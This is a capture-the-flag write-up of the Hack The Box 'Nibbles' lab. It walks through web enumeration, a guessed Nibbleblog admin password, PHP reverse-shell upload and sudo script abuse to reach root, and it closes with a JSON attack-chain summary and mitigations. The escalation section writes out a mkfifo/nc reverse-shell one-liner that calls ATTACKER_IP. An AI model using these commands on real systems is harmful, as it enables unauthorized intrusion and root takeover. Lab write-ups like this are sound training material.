# HTB Nibbles - Web App Enumeration, Auth Guessing, Upload RCE, and Sudo Script Abuse

Scope: authorized HTB lab only.
Focus: Nibbleblog admin compromise, arbitrary PHP upload execution, and root escalation through writable script run with sudo.

---

## 1. Investigation Objective

1. Enumerate exposed services and web application structure.
2. Identify credential leakage and authentication weaknesses.
3. Obtain code execution via upload functionality.
4. Escalate from application user to root using local privilege misconfiguration.

---

## 2. Recon and Application Discovery

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

Observed in common Nibbles path:
- 22/tcp SSH
- 80/tcp HTTP (`Apache/2.4.18`)

Web hints:
- homepage source references `/nibbleblog/`.
- target CMS identified as Nibbleblog.

Directory mapping:

```bash
gobuster dir -u http://<TARGET_IP>/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
```

Key route:
- `admin.php`

---

## 3. Credential Enumeration and Admin Access

Inspect sensitive paths in app content:

```text
/nibbleblog/content/private/config.xml
/nibbleblog/content/private/users.xml
```

Recovered identity indicators:
- admin email/user context discovered.

Successful credential pair in this workflow:
- `admin : nibbles`

Login to admin panel confirmed.

---

## 4. Upload-Based Remote Code Execution

Use PHP reverse shell payload in authorized lab context:

```bash
cp php-reverse-shell.php image.php
```

Set listener:

```bash
nc -lvnp <PORT>
```

Upload through plugin image functionality, then trigger:

```text
http://<TARGET_IP>/nibbleblog/content/private/plugins/my_images/image.php
```

Result:
- shell returned as `nibbler` user.

---

## 5. Privilege Escalation via Writable Script + sudo

Check sudo rights:

```bash
sudo -l
```

If `/home/nibbler/personal/stuff/monitor.sh` is executable as root and writable by current user, append controlled command and execute with sudo.

Example flow:

```bash
echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 7777 >/tmp/f' >> /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

---

## 6. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn 10.10.10.75
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH ...
80/tcp open  http    Apache/2.4.18

analyst@kali:~$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
/admin.php (Status: 200)

Browser evidence:
/content/private/config.xml -> admin@nibbles.com
/content/private/users.xml -> admin account metadata

Admin login:
username: admin
password: nibbles

analyst@kali:~$ nc -lvnp 1337
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.75]
$ whoami
nibbler

nibbler@nibbles:~$ sudo -l
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

nibbler@nibbles:~$ echo '...reverse shell one-liner...' >> /home/nibbler/personal/stuff/monitor.sh
nibbler@nibbles:~$ sudo /home/nibbler/personal/stuff/monitor.sh
# whoami
root
```

---

## 7. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "nibbles_cms_auth_guess_upload_rce_monitor_script_privesc",
	"input_signals": [
		"Nibbleblog path and admin endpoint exposed",
		"Private content files reveal admin identity context",
		"Admin credential guessing succeeded",
		"Upload path allowed executable PHP payload",
		"monitor.sh writable and runnable as root via sudo"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Web Directory and Application Discovery",
			"confidence": 0.94,
			"evidence": "gobuster and source analysis identified nibbleblog/admin routes"
		},
		{
			"step": 2,
			"tactic": "credential_access",
			"technique": "Valid Accounts (Weak/Guessable Password)",
			"confidence": 0.86,
			"evidence": "admin login with guessed credential succeeded"
		},
		{
			"step": 3,
			"tactic": "execution",
			"technique": "Arbitrary File Upload",
			"confidence": 0.92,
			"evidence": "uploaded PHP payload executed and returned shell"
		},
		{
			"step": 4,
			"tactic": "privilege_escalation",
			"technique": "Sudo Misconfiguration (Writable Script)",
			"confidence": 0.95,
			"evidence": "monitor.sh modified then executed as root"
		}
	],
	"hypotheses": [
		"Additional plugin upload paths may allow code execution",
		"Credential reuse may exist for SSH or other services",
		"Other writable root-executed scripts may remain undiscovered"
	],
	"uncertainties": [
		"Unknown whether upload restrictions are extension-only or content-aware",
		"No validation of central logging for admin panel abuse",
		"Scope of compromise beyond single host not confirmed"
	],
	"tool_calls": [
		{"name": "cms_upload_surface_tester", "priority": "high"},
		{"name": "sudo_script_misconfig_scanner", "priority": "high"},
		{"name": "credential_reuse_probe", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Disable executable handling in upload directories",
			"Reset compromised admin credentials",
			"Remove writable root-executed scripts from user-owned paths"
		],
		"hardening": [
			"Enforce strong admin passwords and MFA where possible",
			"Apply strict allowlist validation for uploads (type and content)",
			"Harden sudoers with least privilege and immutable script ownership"
		],
		"monitoring": [
			"Alert on admin login anomalies and repeated failed logins",
			"Monitor execution from plugin and upload paths",
			"Track sudo execution of scripts in user-writable directories"
		]
	}
}
```
